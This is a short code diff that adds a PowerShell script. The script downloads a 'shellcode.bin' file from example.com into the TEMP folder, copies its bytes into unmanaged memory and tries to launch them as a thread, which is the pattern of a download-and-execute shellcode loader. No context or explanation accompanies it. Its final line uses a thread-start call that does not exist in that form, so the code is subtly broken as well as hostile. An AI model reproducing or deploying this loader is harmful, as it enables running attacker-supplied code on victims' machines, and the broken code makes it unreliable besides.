@@ -1,0 +1,5 @@
+IWR https://example.com/shellcode.bin -OutFile $env:TEMP\sc.bin
+$sc = [IO.File]::ReadAllBytes("$env:TEMP\sc.bin")
+$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
+$thread = [System.Threading.Thread]::Start($addr)
